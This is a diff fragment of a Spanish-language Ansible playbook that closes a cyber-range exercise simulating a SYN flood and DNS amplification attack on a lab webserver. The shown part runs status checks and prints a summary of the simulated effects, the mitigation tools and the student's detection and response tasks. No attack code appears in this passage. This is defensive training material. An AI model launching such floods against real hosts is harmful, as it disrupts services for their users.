+          echo "TIME_WAIT: $(ss -tn state time-wait | wc -l)"
+          
+          echo ""
+          echo "============================================"
+          echo "  VERIFICACION COMPLETADA"
+          echo "============================================"
+        dest: /usr/local/bin/final_verification.sh
+        owner: root
+        group: root
+        mode: '0755'
+    
+    - name: Ejecutar verificacion final
+      ansible.builtin.shell: /usr/local/bin/final_verification.sh
+      register: final_check
+      changed_when: false
+    
+    - name: Mostrar verificacion final
+      ansible.builtin.debug:
+        var: final_check.stdout_lines
+
+- name: "Fase 7 - Estado final del escenario"
+  hosts: all
+  become: yes
+  
+  tasks:
+    - name: Generar reporte de estado final
+      ansible.builtin.shell: |
+        echo "=== Estado Final - $(hostname) ==="
+        echo "IP: $(hostname -I)"
+        echo "Servicios:"
+        systemctl list-units --type=service --state=running | grep -E "apache|nginx|postfix|dovecot|mysql|redis|samba|nfs" || true
+        echo "Conexiones: $(ss -tn | wc -l)"
+        echo "=== Fin ==="
+      register: final_status
+      changed_when: false
+    
+    - name: Mostrar estado final
+      ansible.builtin.debug:
+        var: final_status.stdout_lines
+
+- name: "Resumen del escenario"
+  hosts: localhost
+  connection: local
+  become: no
+  
+  tasks:
+    - name: Mostrar resumen
+      ansible.builtin.debug:
+        msg: |
+          ========================================
+          ESCENARIO DDoS SYN FLOOD - BANCO DEL SOL
+          ========================================
+          
+          ATAQUE INICIADO:
+          - Target: 10.10.1.10 (webserver)
+          - Puertos: 80, 443
+          - Tipo: SYN Flood + DNS Amplification
+          - Duracion: ~2 minutos
+          
+          EFECTOS SIMULADOS:
+          - Alto uso de CPU en webserver
+          - Multiples conexiones SYN_RECV
+          - Tabla de conntrack bajo presion
+          - Servicio web degradado
+          - Logs de ataque generados
+          
+          HERRAMENTAL DISPONIBLE:
+          - tcpdump para captura de paquetes
+          - ss/netstat para analisis de conexiones
+          - iptables para mitigacion
+          - fail2ban para proteccion automatica
+          - Script de respuesta rapida: /root/RESPUESTA_RAPIDA.txt
+          
+          ACCIONES DEL ESTUDIANTE:
+          1. Detectar el ataque
+          2. Analizar trafico de red
+          3. Implementar mitigacion
+          4. Verificar efectividad
+          5. Documentar incidente
+          
+          ========================================
